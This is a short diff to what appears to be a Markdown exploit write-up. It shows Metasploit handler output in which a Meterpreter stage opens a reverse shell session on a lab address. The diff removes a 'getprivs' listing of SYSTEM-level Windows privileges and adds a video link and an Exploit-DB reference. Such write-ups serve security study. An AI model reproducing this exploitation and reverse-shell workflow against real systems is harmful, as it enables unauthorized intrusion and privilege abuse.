@@ -65,31 +65,7 @@ msf exploit(handler) > run
 [*] Sending stage (957487 bytes) to 172.16.24.192
 [*] Meterpreter session 1 opened (172.16.24.1:4444 -> 172.16.24.192:51782) at 2016-05-02 15:02:31 +0200
 
-meterpreter > getprivs
-============================================================
-Enabled Process Privileges
-============================================================
-  SeDebugPrivilege
-  SeTcbPrivilege
-  SeAssignPrimaryTokenPrivilege
-  SeLockMemoryPrivilege
-  SeIncreaseQuotaPrivilege
-  SeSecurityPrivilege
-  SeTakeOwnershipPrivilege
-  SeLoadDriverPrivilege
-  SeSystemProfilePrivilege
-  SeSystemtimePrivilege
-  SeProfileSingleProcessPrivilege
-  SeIncreaseBasePriorityPrivilege
-  SeCreatePagefilePrivilege
-  SeCreatePermanentPrivilege
-  SeBackupPrivilege
-  SeRestorePrivilege
-  SeShutdownPrivilege
-  SeAuditPrivilege
-  SeSystemEnvironmentPrivilege
-  SeChangeNotifyPrivilege
-  SeUndockPrivilege
-  SeManageVolumePrivilege
-  ```
-
+'''
+`视频地址:https://www.youtube.com/watch?v=gWcRlam59Fs`
+## ExploitDB地址
+`https://www.exploit-db.com/exploits/39755/`
